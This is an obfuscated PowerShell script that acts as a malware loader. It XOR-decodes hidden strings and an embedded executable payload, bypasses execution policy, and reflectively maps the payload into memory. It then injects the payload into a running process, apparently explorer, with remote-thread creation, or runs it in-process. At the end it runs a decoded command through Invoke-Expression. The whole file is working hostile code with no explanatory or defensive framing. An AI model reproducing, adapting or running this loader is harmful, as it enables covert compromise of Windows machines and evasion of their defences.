       function        KVFkOexnrVn
{
         param
        (
     [Parameter(Position = 0 ,              Mandatory = $true)] [string]         $ITv,
  [Parameter(Position = 1 ,       Mandatory = $true)] [byte]          $MUbdopjYnzXgfNpcLzp
        )
      $zPcGUodd = [System.Convert]::FromBase64String( $ITv )
     for (       $EGzJGiTxlBEoExLWeY =          0;          $EGzJGiTxlBEoExLWeY  -lt    $zPcGUodd.length;        $EGzJGiTxlBEoExLWeY++      )
 {
    $zPcGUodd[$EGzJGiTxlBEoExLWeY] =       $zPcGUodd[$EGzJGiTxlBEoExLWeY]     -bxor          $MUbdopjYnzXgfNpcLzp
          }
 return         [System.Text.Encoding]::ASCII.GetString( $zPcGUodd )
    }
     $mLGYPq      =                   KVFkOexnrVn                    'eH5kY2otXnR+eWhgNgAHeH5kY2otXnR+eWhgI194Y3lkYGgjRGN5aH9...1dHQlhkelh3ekI2AActLS0tcAAHcAAH'                      0x0d # NOTE: The actual 12036-character Base64 string omitted for readability.
  $ydSaqHPw         =   KVFkOexnrVn                  'SFd/f1p+Y3xhZzsxeHZhfXZ/ICE9d39/...Wn1nICEzY1VpUT8zWn1nQ2dhM0Z1RGdROig='  # NOTE: The actual 2808-character Base64 string omitted for readability.                   0x13
       $OBpz = KVFkOexnrVn                 'x9ne0cDZ'                   0x90
 $yHcAgmituU = KVFkOexnrVn                 'saGak4CC'                         0xf2
           Add-Type              -TypeDefinition                   $mLGYPq       -Language                  $yHcAgmituU
   $MdEqQQzojzK                 = $null
Function SbaZDMgKATRWzngGjv
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $true)] [Int64] $Qek,    
        [Parameter(Position = 1, Mandatory = $true)] [Int64] $QxEuvZkrcKGvfqAe
    )
    [Byte[]]$wbAfuDZKzKazZXzBmiEb = [BitConverter]::GetBytes($Qek)
    [Byte[]]$lFSQElzoENVkAYRZFCpS = [BitConverter]::GetBytes($QxEuvZkrcKGvfqAe)
    [Byte[]]$fCvCdxfAdFeiC = [BitConverter]::GetBytes([UInt64]0)
    if ($wbAfuDZKzKazZXzBmiEb.Count -eq $lFSQElzoENVkAYRZFCpS.Count)
    {
        $EsWWAflU = 0
        for ($wMK = 0; $wMK -lt $wbAfuDZKzKazZXzBmiEb.Count; $wMK++)
        {
            $RbdhpuS = $wbAfuDZKzKazZXzBmiEb[$wMK] - $EsWWAflU
            if ($RbdhpuS -lt $lFSQElzoENVkAYRZFCpS[$wMK])
            {
                $RbdhpuS += 256
                $EsWWAflU = 1
            }
            else
            {
                $EsWWAflU = 0
            }
            [UInt16]$hwMokVWwy = $RbdhpuS - $lFSQElzoENVkAYRZFCpS[$wMK]
            $fCvCdxfAdFeiC[$wMK] = $hwMokVWwy -band 0x00FF
        }
    }
    else
    {
        Throw
    }
    return [BitConverter]::ToInt64($fCvCdxfAdFeiC, 0)
}
Function aajgBHe
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $true)] [Int64] $gwrpZTeRlHURpLCn,    
        [Parameter(Position = 1, Mandatory = $true)] [Int64] $URyIuveTSljiJViQ
    )
    [Byte[]]$dIrkhrabCDFOTBjt = [BitConverter]::GetBytes($gwrpZTeRlHURpLCn)
    [Byte[]]$OVeZty = [BitConverter]::GetBytes($URyIuveTSljiJViQ)
    [Byte[]]$kFva = [BitConverter]::GetBytes([UInt64]0)
    if ($dIrkhrabCDFOTBjt.Count -eq $OVeZty.Count)
    {
        $mPmo = 0
        for ($xzpdJomYU = 0; $xzpdJomYU -lt $dIrkhrabCDFOTBjt.Count; $xzpdJomYU++)
        {
            [UInt16]$ARoFhYfKxMDbvAOC = $dIrkhrabCDFOTBjt[$xzpdJomYU] + $OVeZty[$xzpdJomYU] + $mPmo
            $kFva[$xzpdJomYU] = $ARoFhYfKxMDbvAOC -band 0x00FF
            if (($ARoFhYfKxMDbvAOC -band 0xFF00) -eq 0x100)
            {
                $mPmo = 1
            }
            else
            {
                $mPmo = 0
            }
        }
    }
    return [BitConverter]::ToInt64($kFva, 0)
}
Function zrBLzBTvyqwFqSbRG
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $true)] [UInt64] $BREbrb
    )
    [Byte[]]$iUYgRwOGb = [BitConverter]::GetBytes($BREbrb)
    return ([BitConverter]::ToInt64($iUYgRwOGb, 0))
}
Function bhmLC
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $true)] [Int16] $BZiRsSJRKl
    )
    [Byte[]]$bTRerbjI = [BitConverter]::GetBytes($BZiRsSJRKl)
    return ([BitConverter]::ToUInt16($bTRerbjI, 0))
}
Function TJyfvjkWbYPqaUWM
{
    Param( [OutputType([Type])]
           [Parameter( Position = 0)] [Type[]] $jYFfQQQULmH = (New-Object Type[](0)),
           [Parameter( Position = 1 )] [Type] $QSPMlnMnlBhm = [Void] )
        $NWCMQfjgzic = [AppDomain]::CurrentDomain
    $TbGnhHQKTbEIzLDQXf = New-Object Reflection.AssemblyName( $( KVFkOexnrVn 'uI+Mho+Jno+Oro+Gj42Lno8=' 0xea ) )
    $JFAnPlSaX = $NWCMQfjgzic.DefineDynamicAssembly($TbGnhHQKTbEIzLDQXf, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $kNTKlOLNWLLqorq = $JFAnPlSaX.DefineDynamicModule( $( KVFkOexnrVn 'ye7N5e3v8vnN7+T17OU=' 0x80 ), $false)
    $LLypXHdHGujpe = $kNTKlOLNWLLqorq.DefineType( $( KVFkOexnrVn 'oZWoiYCJi42YibiVnIk=' 0xec ), $( KVFkOexnrVn 'TWJvfX0iLl57bGJnbSIuXWtvYmtqIi5PYH1nTWJvfX0iLk97emFNYm99fQ==' 0x0e ), [System.MulticastDelegate])
    $lsQy = $LLypXHdHGujpe.DefineConstructor( $( KVFkOexnrVn '8ffw08bAysLP7cLOxo+D68rHxuHa8MrEj4Pz1sHPysA=' 0xa3 ), [System.Reflection.CallingConventions]::Standard, $jYFfQQQULmH)
    $lsQy.SetImplementationFlags( $( KVFkOexnrVn 'MBcMFgsPB05CLwMMAwUHBg==' 0x62 ))
    $xxiYeIl = $LLypXHdHGujpe.DefineMethod( $( KVFkOexnrVn 'KQ4WDwsF' 0x60 ), $( KVFkOexnrVn '/NnOwMXPgIzkxcjJ7tX/xcuAjOLJ2//Aw9iAjPrF3tjZzcA=' 0xac ), $QSPMlnMnlBhm, $jYFfQQQULmH)
    $xxiYeIl.SetImplementationFlags($( KVFkOexnrVn 'MBcMFgsPB05CLwMMAwUHBg==' 0x62 ) )
    return $LLypXHdHGujpe.CreateType()
}
function JLcFXQuRyANMuuS 
{
    param
    (
        [Parameter(Position = 0 , Mandatory = $true)] [IntPtr] $XMNnl,
        [Parameter(Position = 1 , Mandatory = $true)] [IntPtr] $nvT,
        [Parameter(Position = 2 , Mandatory = $true)] [UInt32] $xUGravUVnSIbEVjO,
        [Parameter(Position = 3 , Mandatory = $true)] [System.IntPtr] $PXKgWLcfPQ
    )
    $pFvljfzugcPqC = 0xa000
    if([System.IntPtr]::Size -eq 4)
    {
        $pFvljfzugcPqC = 0x3000
    }
    if($xUGravUVnSIbEVjO -eq 0)
    {
        return $false
    }
    $PmcDvlqFdxdrxIYf = SbaZDMgKATRWzngGjv $nvT $PXKgWLcfPQ
    $VbVCUyJcAm = aajgBHe $XMNnl $(zrBLzBTvyqwFqSbRG $xUGravUVnSIbEVjO)
    $kIAZgngnbPEx = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VbVCUyJcAm,[Type][FVJZWwLmIMAunJ.pVbiefFyVRujQGkJiRND])
    while ($kIAZgngnbPEx.yAP) 
    {
        $jUNvRdwVsrGoisid = aajgBHe $XMNnl $(zrBLzBTvyqwFqSbRG $kIAZgngnbPEx.yAP)
                         $uRHtCrEBVoqTnoKwf = ($kIAZgngnbPEx.UBLijQDyl - ([UInt32]8)) /2
        $LJiOe = aajgBHe $VbVCUyJcAm 8
        for($sdJinRawVc=0;$sdJinRawVc -lt $uRHtCrEBVoqTnoKwf ; $sdJinRawVc++)
        {
                            $HAumobPgJgFEVYule = bhmLC $([System.Runtime.InteropServices.Marshal]::ReadInt16($LJiOe))
            if( $($HAumobPgJgFEVYule -band $pFvljfzugcPqC) -eq $pFvljfzugcPqC)
            {
                             $winpeWwYGIXPcXsJ = $HAumobPgJgFEVYule -band 0xfff
                                   $CMqjFsfdzEcGPqIPZtzc = aajgBHe $jUNvRdwVsrGoisid $winpeWwYGIXPcXsJ
                                             $ULuiFXqBSvl = aajgBHe $([System.Runtime.InteropServices.Marshal]::ReadIntPtr($CMqjFsfdzEcGPqIPZtzc)) $PmcDvlqFdxdrxIYf
                [System.Runtime.InteropServices.Marshal]::WriteIntPtr($CMqjFsfdzEcGPqIPZtzc,$ULuiFXqBSvl)
            }
                        $LJiOe = aajgBHe $LJiOe 2
        }
        $VbVCUyJcAm = aajgBHe $VbVCUyJcAm $(zrBLzBTvyqwFqSbRG $kIAZgngnbPEx.UBLijQDyl)
        $kIAZgngnbPEx = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VbVCUyJcAm,[Type][FVJZWwLmIMAunJ.pVbiefFyVRujQGkJiRND])
    }
    return $true
}
function hqhiaMvTP
{
    param
    (
        [Parameter(Position = 0 , Mandatory = $true)] [UInt32] $RzDoSdHusWmrxZCrph,
        [Parameter(Position = 1 , Mandatory = $true)] [IntPtr] $caljGFvCSsiQd,
        [Parameter(Position = 2 , Mandatory = $true)] [UInt32] $cMsmgTuNxKKKMmdi,
        [Parameter(Position = 3 , Mandatory = $true)] [UInt32] $tRzQC,
        [Parameter(Position = 4 , Mandatory = $true)] [bool] $iukXAChqrj,
        [Parameter(Position = 5 , Mandatory = $true)] [ref] $IiKYuMbESa
    )
    $IiKYuMbESa.value = $false
    $xSEIbedKeR = $MdEqQQzojzK::GwzjVUS( [UInt32]0x43A, $false, [UInt32]$RzDoSdHusWmrxZCrph )
    if ( $xSEIbedKeR -ne 0 )
    {
        $htNOqBlZHqoPhJUUgww = $MdEqQQzojzK::GWWyqcIqlrxcSzhkYyB( 0, $cMsmgTuNxKKKMmdi, 0x00001000 -bor 0x00002000, 0x04 )
        if ( $htNOqBlZHqoPhJUUgww -ne 0 )
        {
            $yYqZg = $MdEqQQzojzK::LMXKsIhb()
            $PrpXIE = $MdEqQQzojzK::PbC( $yYqZg, $htNOqBlZHqoPhJUUgww, $caljGFvCSsiQd, $cMsmgTuNxKKKMmdi, [ref]([UInt32]0 ) )
            if ( $PrpXIE -eq $true )
            {    
                $LJSHTMTQTc = $MdEqQQzojzK::LeA( [IntPtr]$xSEIbedKeR, 0, $cMsmgTuNxKKKMmdi, 0x00001000 -bor 0x00002000, 0x40 )
                if ( $LJSHTMTQTc -ne 0 )
                {  
                    $bwKeFSYd = [System.Runtime.InteropServices.Marshal]::PtrToStructure($htNOqBlZHqoPhJUUgww,[Type][FVJZWwLmIMAunJ.fckTB])
                    $JsJdbceXFzisPeCQxRV = 0
                    if ( $iukXAChqrj -eq $true )
                    {
                        $JsJdbceXFzisPeCQxRV = [System.Runtime.InteropServices.Marshal]::PtrToStructure($(aajgBHe $htNOqBlZHqoPhJUUgww $(zrBLzBTvyqwFqSbRG $bwKeFSYd.MlnjtQMnrnXZZHy)), [Type][FVJZWwLmIMAunJ.PEBJovGwOyScv] )
                    }
                    else 
                    {
                        $JsJdbceXFzisPeCQxRV = [System.Runtime.InteropServices.Marshal]::PtrToStructure($(aajgBHe $htNOqBlZHqoPhJUUgww $(zrBLzBTvyqwFqSbRG $bwKeFSYd.MlnjtQMnrnXZZHy)), [Type][FVJZWwLmIMAunJ.itmZDNQqlPdJ] )
                    }
                    JLcFXQuRyANMuuS $htNOqBlZHqoPhJUUgww $LJSHTMTQTc $JsJdbceXFzisPeCQxRV.zYNxTaaCThezNqRAk.qCtLk.yhDHpQ $(zrBLzBTvyqwFqSbRG $JsJdbceXFzisPeCQxRV.zYNxTaaCThezNqRAk.npGKhFsilgcrbCS )
                    $PrpXIE = $MdEqQQzojzK::PbC( $xSEIbedKeR, $LJSHTMTQTc, $htNOqBlZHqoPhJUUgww, $cMsmgTuNxKKKMmdi, [ref]([UInt32]0 ) ) 
                    if ( $PrpXIE -eq $true )
                    {               
                        $sHfDMdJVKxNWZCmHVUx = aajgBHe $LJSHTMTQTc $( zrBLzBTvyqwFqSbRG ( $tRzQC ) )
                        $BkZNVqDRycJ = $MdEqQQzojzK::oWCJjlFVDstP( $xSEIbedKeR, 0, 0, $sHfDMdJVKxNWZCmHVUx, 0, 0, 0 )
                        if ( $BkZNVqDRycJ -ne 0 )
                        {
                            $IiKYuMbESa.value = $true
                        }
                    }
                }
            }
            $MdEqQQzojzK::OGJ( $htNOqBlZHqoPhJUUgww, ([UInt32]0), 0x00008000 ) | Out-Null
        }
        $MdEqQQzojzK::VHKgdMYGCNEeRutz( $xSEIbedKeR ) | Out-Null
    }
    return
}
function ZTq
{
    param
    (
        [Parameter(Position = 0 , Mandatory = $true)] [string] $ZNvxllryhup,
        [Parameter(Position = 1 , Mandatory = $true)] [IntPtr] $XsxPhFalOXYDi,
        [Parameter(Position = 2 , Mandatory = $true)] [UInt32] $CzeyZrbdhHtaTDHBgr,
        [Parameter(Position = 3 , Mandatory = $true)] [UInt32] $gqEL,
        [Parameter(Position = 4 , Mandatory = $true)] [bool] $hIgXrgJlGCTZBSKnBdEd,
        [Parameter(Position = 5 , Mandatory = $true)] [ref] $kBvztQgTjZCYfhI
    )
    $kBvztQgTjZCYfhI.value = $false
    $zfPyfNEKBrTixrfjGDO = KVFkOexnrVn                         'YXlhICI4cnp6'                     0x16
    foreach ( $nvpFyQPlXyJbLMesdxw in                get-process                    $ZNvxllryhup )
    {
        $oCowdlmSZbWcVIE =                    $nvpFyQPlXyJbLMesdxw.id
        if ( $hIgXrgJlGCTZBSKnBdEd -eq $true )
        {
            $oCowdlmSZbWcVIE = 0;
            $PWKSLzIOfDVZbN = $false
            foreach ( $ghMXvkeGxqYfbQMKLJ in $nvpFyQPlXyJbLMesdxw.modules )
            {
                if ( $ghMXvkeGxqYfbQMKLJ.filename -eq                           $zfPyfNEKBrTixrfjGDO )
                {
                    $PWKSLzIOfDVZbN = $true
                }
            }
            if ( $PWKSLzIOfDVZbN -eq $false )
            {
                $oCowdlmSZbWcVIE = $nvpFyQPlXyJbLMesdxw.id
            }
        }
        if ( $oCowdlmSZbWcVIE -ne 0 )
        {
            if ( $nvpFyQPlXyJbLMesdxw.mainwindowhandle -ne 0 )
            {
                $QPll = 0
                hqhiaMvTP $oCowdlmSZbWcVIE $XsxPhFalOXYDi $CzeyZrbdhHtaTDHBgr $gqEL $hIgXrgJlGCTZBSKnBdEd ([ref]$QPll)
                if ( [bool]$QPll -eq $true )
                {
                    $kBvztQgTjZCYfhI.value = $true
                    break
                }
            }
        }
    }
    return
}
                                  [byte[]]$veonMsiZWUOwYkRq            =            @(0x8c,0x9b,0x51,0xc1,0xc2,0xc1,0xc1,0xc1,0xc5,0xc1,0xc1,0xc1,0x3e,...,0xb8,0xb8,0xb8,0xb8,0xb8,0xb8,0xb8) # NOTE: The actual 888399-character Base64 string omitted for readability.
        [byte[]]$UzQXKdkCl = 0                
      $xtCfWsB = $false
        $aYyNfL = KVFkOexnrVn 'M1x+bzZMdnJUeXF+eG87Nlh3emhoO0xydSgpRFRrfml6b3J1fEhiaG9+djtnO0h+d354bzZUeXF+eG87VEhaaXhzcm9+eG9uaX47Nl5paXRpWnhvcnR1O0hvdGsyNVRIWml4c3Jvfnhvbml+' 0x1b
           $aYyNfL = Invoke-Expression $aYyNfL
                    $dfYU = KVFkOexnrVn 'cGxucA==' 0x5a
if ( $aYyNfL -like $dfYU )
{      
          $esQfrrXKSVH = KVFkOexnrVn 'v7O66Oo=' 0xde
    if ( $env:PROCESSOR_ARCHITECTURE -ne $esQfrrXKSVH )
    {
                  $iUVKJiYVwhsegsc = KVFkOexnrVn 'xerg6vf47fDv/MXu8Pf99u7q6fbu/Ovq8fz19cXvqLepxen27vzr6vH89fW3/OH8' 0x99
        if ($myInvocation.Line) 
        {
          &"$env:WINDIR$iUVKJiYVwhsegsc" -ExecutionPolicy ByPass -NoLogo -NonInteractive -NoProfile -NoExit $myInvocation.Line
        }
        else
        {
          &"$env:WINDIR$iUVKJiYVwhsegsc" -ExecutionPolicy ByPass -NoLogo -NonInteractive -NoProfile -NoExit -file "$($myInvocation.InvocationName)" $args
        }
        exit $lastexitcode
    }
    for( $qjcUVvsjhGiSR = 0; $qjcUVvsjhGiSR -lt $IfjC.Length; $qjcUVvsjhGiSR++ )
    {
        $IfjC[$qjcUVvsjhGiSR] = $IfjC[$qjcUVvsjhGiSR] -bxor 0xb8
    }
                [byte[]]$UzQXKdkCl = $IfjC
    $xtCfWsB = $true
}
else
{
                 for(        $QjvHFBDiXaLWWjSJznx          =          0;                $QjvHFBDiXaLWWjSJznx     -lt            $veonMsiZWUOwYkRq.Length;       $QjvHFBDiXaLWWjSJznx++ )
           {    
                         $veonMsiZWUOwYkRq[           $QjvHFBDiXaLWWjSJznx      ]                      =               $veonMsiZWUOwYkRq[      $QjvHFBDiXaLWWjSJznx]                 -bxor            0xc1 
                  }          
           [byte[]]$UzQXKdkCl               =        $veonMsiZWUOwYkRq
}
                  [System.IntPtr]$JDWPFdlvaVMv = 0
       [System.IntPtr]$WrOG = 0
              $MdEqQQzojzK          =    Add-Type                -MemberDefinition           $ydSaqHPw      -Name            'MdEqQQzojzK' -Namespace $OBpz -PassThru
           $vmOwk = $MdEqQQzojzK::LMXKsIhb()
try 
{
                       $JDWPFdlvaVMv = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(            $UzQXKdkCl.Length )
                 [System.Runtime.InteropServices.Marshal]::Copy(              $UzQXKdkCl, 0,         $JDWPFdlvaVMv,             $UzQXKdkCl.Length )
}
catch 
{
    return
}
     $duqVjYxqCHDDUwUyOIw =           [System.Runtime.InteropServices.Marshal]::PtrToStructure(           $JDWPFdlvaVMv,               [Type][FVJZWwLmIMAunJ.fckTB])
 $ekqmXRdgvyfhqhv = 0
if ( $xtCfWsB -eq $true )
{
$ekqmXRdgvyfhqhv = [System.Runtime.InteropServices.Marshal]::PtrToStructure($(aajgBHe $JDWPFdlvaVMv $(zrBLzBTvyqwFqSbRG $duqVjYxqCHDDUwUyOIw.MlnjtQMnrnXZZHy)), [Type][FVJZWwLmIMAunJ.PEBJovGwOyScv] )
}
else 
{
    $ekqmXRdgvyfhqhv = [System.Runtime.InteropServices.Marshal]::PtrToStructure($(aajgBHe $JDWPFdlvaVMv $(zrBLzBTvyqwFqSbRG $duqVjYxqCHDDUwUyOIw.MlnjtQMnrnXZZHy)), [Type][FVJZWwLmIMAunJ.itmZDNQqlPdJ] )
}
$WrOG = $MdEqQQzojzK::GWWyqcIqlrxcSzhkYyB( 0, $ekqmXRdgvyfhqhv.zYNxTaaCThezNqRAk.JkiMHnJTKzkYV, 0x00001000 -bor 0x00002000, 0x04 )
           if(              $WrOG                  -eq 0 )
{
    return
}
$iybtmJHFKHlbLcNBHcbm = $MdEqQQzojzK::PbC( $vmOwk, $WrOG, $JDWPFdlvaVMv, $ekqmXRdgvyfhqhv.zYNxTaaCThezNqRAk.YVGO, [ref]([UInt32]0) ) 
if ( $iybtmJHFKHlbLcNBHcbm -eq $false )
{
    return
}
$iqEBQnNpoGoDaEs = $( aajgBHe $JDWPFdlvaVMv $( zrBLzBTvyqwFqSbRG $duqVjYxqCHDDUwUyOIw.MlnjtQMnrnXZZHy ) )
if ( $xtCfWsB -eq $true )
{
    $iqEBQnNpoGoDaEs = aajgBHe $iqEBQnNpoGoDaEs $( [System.Runtime.InteropServices.Marshal]::SizeOf( [Type][FVJZWwLmIMAunJ.PEBJovGwOyScv] ) ) 
}
else 
{
    $iqEBQnNpoGoDaEs = aajgBHe $iqEBQnNpoGoDaEs $( [System.Runtime.InteropServices.Marshal]::SizeOf( [Type][FVJZWwLmIMAunJ.itmZDNQqlPdJ] ) ) 
}
               for( $THYFleXpBUPmVGizSSJr = 0; $THYFleXpBUPmVGizSSJr -lt               $ekqmXRdgvyfhqhv.mZBCumKv.zKDMyELLtHP;          $THYFleXpBUPmVGizSSJr++ )
          {
    $LeAkPFqb = [System.Runtime.InteropServices.Marshal]::PtrToStructure(             $iqEBQnNpoGoDaEs,[Type][FVJZWwLmIMAunJ.PRSCEaOOpCLa] )
    $PvjihUkDNQW  =          aajgBHe $JDWPFdlvaVMv $(      zrBLzBTvyqwFqSbRG $LeAkPFqb.GKrjmuS )
    $knN =            aajgBHe $WrOG $(           zrBLzBTvyqwFqSbRG $LeAkPFqb.YYVCjKiIZuShmy )
    $iybtmJHFKHlbLcNBHcbm = $MdEqQQzojzK::PbC( $vmOwk, $knN, $PvjihUkDNQW, $LeAkPFqb.EHLTpiBqGlChOEfp, [ref]([UInt32]0 ) )
    if ( $iybtmJHFKHlbLcNBHcbm -eq $false )
    {
        return
    }
    $iqEBQnNpoGoDaEs = aajgBHe $iqEBQnNpoGoDaEs $([System.Runtime.InteropServices.Marshal]::SizeOf([Type][FVJZWwLmIMAunJ.PRSCEaOOpCLa]))
}
$LaxWXJi = 0
ZTq $(KVFkOexnrVn 'BBkRDQ4TBBM=' 0x61 ) $WrOG $ekqmXRdgvyfhqhv.zYNxTaaCThezNqRAk.JkiMHnJTKzkYV $ekqmXRdgvyfhqhv.zYNxTaaCThezNqRAk.MTmRtJvw $xtCfWsB ([ref]$LaxWXJi)
if( [bool]$LaxWXJi -ne $true )
{
    [UInt32]$GJclpDfCnADlrmiSp = 0
    $ACcGWwYoSyqOX = $MdEqQQzojzK::qDfSchgJRduYvRXBaYJ( $vmOwk, $WrOG, $ekqmXRdgvyfhqhv.zYNxTaaCThezNqRAk.JkiMHnJTKzkYV, 0x40, [ref]$GJclpDfCnADlrmiSp )
    if ( $ACcGWwYoSyqOX -eq $true )
    {
        JLcFXQuRyANMuuS $WrOG $WrOG $ekqmXRdgvyfhqhv.zYNxTaaCThezNqRAk.qCtLk.yhDHpQ $(zrBLzBTvyqwFqSbRG $ekqmXRdgvyfhqhv.zYNxTaaCThezNqRAk.npGKhFsilgcrbCS)
                      $ZyipoCwLPQxzSx =                  aajgBHe $WrOG $( zrBLzBTvyqwFqSbRG (           $ekqmXRdgvyfhqhv.zYNxTaaCThezNqRAk.MTmRtJvw ) )
                         $kPlTyEbhrhQfdrokP = TJyfvjkWbYPqaUWM              @([System.IntPtr],[UInt32],[System.IntPtr]) ([bool])
              $lEmeTrCIkhBP =               [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer( $ZyipoCwLPQxzSx, $kPlTyEbhrhQfdrokP )
                    $lEmeTrCIkhBP.Invoke(    0,              0,               0      )     |                      Out-Null
    }
}
$dvpfn =                         KVFkOexnrVn          'Y0FQCXNJTWtGTkFHUARzTUoXFnt3TEVAS1NHS1RdBFgEYktWYUVHTAlrRk5BR1AEXwB7CmBBSEFQQQwNH1kEWARrUVAJalFISA=='                     0x24
$dvpfn | Invoke-Expression
